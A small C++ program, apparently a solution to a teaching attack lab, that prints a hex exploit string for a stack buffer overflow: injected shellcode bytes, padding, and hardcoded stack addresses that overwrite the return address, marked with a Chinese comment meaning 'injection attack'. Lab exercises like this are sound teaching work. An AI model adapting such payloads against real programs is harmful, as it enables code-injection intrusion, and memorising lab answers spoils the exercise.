#include <cstdio>
#include <cstring>

using i32 = int;

void print(char *tmp)
{
	int len = strlen(tmp);
	for (i32 i = len - 2; i >= 0; i -= 2) {
		for (i32 j = 0; j < 2; ++j) {
			putchar(tmp[i + j]);
		}
		putchar(' ');
	}
}

int main(void)
{
	printf("48 c7 c0 38 15 0f 0c 68 aa 14 40 00 c3 ");
	for (int i = 13; i < 48; ++i) {
		printf("00 ");
	}
	print("00007fffffffda70");
	print("00007fffffffda00");//注入攻击
	return 0;
}
